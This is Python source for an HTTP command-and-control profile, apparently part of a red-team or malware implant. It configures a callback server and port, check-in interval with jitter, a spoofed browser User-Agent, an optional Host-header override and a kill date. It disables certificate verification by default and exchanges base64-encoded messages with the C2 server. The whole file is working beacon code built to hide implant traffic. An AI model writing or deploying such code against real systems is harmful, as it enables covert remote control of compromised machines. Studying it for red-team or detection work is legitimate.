import asyncio
import random
import aiohttp
import base64
import json
import ssl
import time
from typing import Dict, Optional, Any

class HttpProfile:
    def __init__(self, config=None):
        # Default configuration
        self.config = {
            "callback_host": "192.168.79.6",  # C2 server IP
            "callback_port": 8443,             # C2 server port
            "callback_interval": 10,           # Seconds between check-ins
            "encrypted_exchange_check": False, # Enable certificate pinning
            "callback_jitter": 23,             # Jitter percentage (0-100)
            "headers": {                       # HTTP headers to use
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            },
            "callback_uri": "/api/v1.0/agent",  # URI path for callbacks
            "killdate": "",                    # Date to stop callbacks (YYYY-MM-DD)
            "callback_host_header": "",        # Optional host header override
        }
        
        # Override defaults with provided config
        if config:
            self.config.update(config)
        
        # Setup the HTTP session
        self.session = None
        self.ssl_context = None
        
        # If the killdate is set and passed, agent will not communicate
        if self.config["killdate"]:
            try:
                killdate = time.strptime(self.config["killdate"], "%Y-%m-%d")
                if time.time() > time.mktime(killdate):
                    raise Exception("Kill date reached, stopping communications")
            except ValueError:
                pass  # Invalid killdate format, ignore
    
    async def initialize(self):
        """Initialize the HTTP session"""
        # Create SSL context for HTTPS connections
        self.ssl_context = ssl.create_default_context()
        
        # Disable certificate verification if not using encryption check
        if not self.config["encrypted_exchange_check"]:
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Create HTTP session with default headers
        self.session = aiohttp.ClientSession(headers=self.config["headers"])
    
    def get_callback_url(self) -> str:
        """Get the full callback URL"""
        protocol = "https"
        host = self.config["callback_host"]
        port = self.config["callback_port"]
        uri = self.config["callback_uri"]
        
        return f"{protocol}://{host}:{port}{uri}"
    
    async def send_message(self, message: str) -> Optional[str]:
        """Send a message to the C2 server"""
        if not self.session:
            await self.initialize()
        
        url = self.get_callback_url()
        
        try:
            # Encode the message in base64
            encoded_message = base64.b64encode(message.encode()).decode()
            
            # Prepare the data to send
            data = {
                "data": encoded_message
            }
            
            # Add custom headers if host header is specified
            headers = {}
            if self.config["callback_host_header"]:
                headers["Host"] = self.config["callback_host_header"]
            
            # Send the request
            async with self.session.post(
                url, 
                json=data, 
                ssl=self.ssl_context,
                headers=headers
            ) as response:
                if response.status == 200:
                    # Parse the response
                    response_data = await response.json()
                    
                    # Decode the response if it's base64 encoded
                    if "data" in response_data:
                        decoded_data = base64.b64decode(response_data["data"]).decode()
                        return decoded_data
                    
                    return json.dumps(response_data)
                else:
                    print(f"Error: HTTP status {response.status}")
                    return None
        except Exception as e:
            print(f"Error sending message: {str(e)}")
            return None
    
    async def close(self):
        """Close the HTTP session"""
        if self.session:
            await self.session.close()
            self.session = None